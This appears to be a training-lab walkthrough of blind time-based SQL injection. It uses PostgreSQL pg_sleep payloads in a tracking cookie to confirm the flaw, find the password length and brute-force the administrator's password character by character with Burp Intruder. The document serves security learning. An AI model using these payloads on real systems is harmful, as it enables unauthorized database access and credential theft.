# Blind SQL injection with time delays and information retrieval
* This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
* The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
* The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
	* To solve the lab, log in as the `administrator` user.

### 1. Modify the `TrackingId` cookie to test 10 second delay
* Use the URL encoding to use.
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --
```
* As a result, the application takes 10 seconds to respond

### 2. Modify the `TrackingId` cookie with false statement to confirm no delay
```sql
'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END --
```
* No delay from the request.

### 3. Confirming the exsitence of `administrator` user in `users` table
```sql
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
```
* As a result, the application takes 10 seconds delay. It means the `administrator` user is in the `users` table.

### 4. Identify how many characters are in the password of the `administrator` user
```bash
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password) > 1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
.
.
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password) > 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
```
* When put 19, the application takes 10 seconds to respond and when put 20, it does not take any response. It means that the password is 20 characters long.

### 5. Burp Intruder to Bruteforce Password
* At the position, Put this at the `TrackingId` and put a payload position on `a`
```sql
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
```
![60](https://user-images.githubusercontent.com/53956303/160507814-f1e023d8-4daa-49ac-97c8-5a27ce382a7c.png)
* Set the simple list `a-z and 0-9` and attack until the 20 password are fully revealed.
	* add `Response Reveived` column on the attacking panel.
* From the result, only one request has a huge response recived value. That is the right character for the password.

![61](https://user-images.githubusercontent.com/53956303/160508322-2a86a5bc-1d7f-4af1-b6e2-b643f806cd69.png)
* After 20 times of finding, the password `gs37qtu7csvbei5n7lag` is given.
	* With obtained password, access to the administrator account is granted. The lab is solved.
